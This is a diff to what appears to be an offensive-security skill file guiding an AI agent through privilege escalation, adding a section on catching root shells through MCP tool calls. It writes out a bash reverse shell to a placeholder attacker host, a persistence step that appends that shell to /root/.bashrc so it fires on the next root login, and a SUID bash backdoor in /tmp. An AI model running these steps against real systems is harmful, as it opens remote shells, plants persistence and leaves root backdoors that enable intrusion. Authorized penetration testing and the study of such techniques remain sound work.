@@ -795,6 +795,29 @@ After success → update state.md, log finding, proceed to **Step 10**.
 
 ## Step 10: Escalation and Routing
 
+### Reverse Shell via MCP
+
+When path abuse achieves code execution as a privileged user, **catch the shell
+via the MCP shell-server** rather than relying on local shell spawning. Many
+vectors in this skill (NFS SUID, Docker group, library hijacking, profile
+injection) produce root shells asynchronously or in a different context that
+the agent cannot interact with directly.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Use a reverse shell payload in the exploitation step:
+   ```bash
+   # For writable /etc/passwd, NFS SUID, Docker/LXD group, library hijack:
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+   # For profile injection (fires on next root login):
+   echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1 &' >> /root/.bashrc
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="id")`
+
+If the target lacks outbound connectivity, use the SUID bash approach
+(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) and access it
+through an existing shell session.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
